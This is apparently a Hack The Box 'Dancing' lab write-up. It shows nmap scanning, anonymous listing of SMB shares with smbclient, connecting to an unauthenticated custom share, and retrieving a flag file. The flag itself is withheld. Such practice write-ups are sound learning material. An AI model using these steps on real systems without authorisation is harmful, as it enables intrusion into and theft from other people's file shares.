# Dancing
#HTB #SMB #very-easy #networks-services
## Target:
*Name:* Dancing

*IP:* 10.129.127.221
## Vulnerability: 
SMB share (`WorkShares`) is accessible without credentials.
## Steps:
#### 1) Reconnaissance
Used nmap to check for open ports: 
**Code:**
```
nmap -sV 10.129.127.221
```
**Result:**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-29 15:32 -0400
Nmap scan report for 10.129.127.221
Host is up (0.025s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
```
Port 445 (`microsoft-ds`) corresponds to SMB (Server Message Block), a file sharing protocol used by Windows systems.
#### 2) Listing SMB service workgroups

**Code:**
```
smbclient -L //10.129.127.221 -N
```
**Result:**
```

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.127.221 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
#### 3) Connecting to `WorkShares` workgroup
The $ convention means the share is hidden from normal browse/listing, while shares such as ADMIN$, C$, and IPC$ are standard Windows administrative/system shares.
`WorkShares` is a custom one created by a person, it is our priority to check.

**Code:** 
```
smbclient //10.129.127.221/Workshares -N
```
**Result:**
```
Try "help" to get a list of possible commands.
smb: \> 
```
We are now connected to that share.
#### 4) Finding the flag
```
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

                5114111 blocks of size 4096. 1753678 blocks available
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

                5114111 blocks of size 4096. 1753678 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \James.P\> 

```
We can now open the `flag.txt` file in our machine: 
```
┌──(__________)-[~]
└─$ cat flag.txt
<FLAG>                                                 
```
## Flag: 
[Not disclosed — solve it yourself!]
## Key takeaway:
Always check SMB shares for null/guest access, hidden shares (`$`) require admin credentials, but custom shares are often left accessible without authentication.
